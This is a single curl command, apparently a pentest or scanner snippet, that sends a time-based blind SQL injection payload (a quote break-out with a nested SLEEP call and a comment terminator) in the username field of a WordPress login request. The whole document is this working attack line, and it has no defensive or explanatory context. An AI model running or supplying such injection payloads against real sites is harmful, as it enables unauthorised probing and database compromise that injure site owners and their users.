curl -sS -X POST "$BASE/wp-login.php" -d "log=admin' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)-- -&pwd=x"
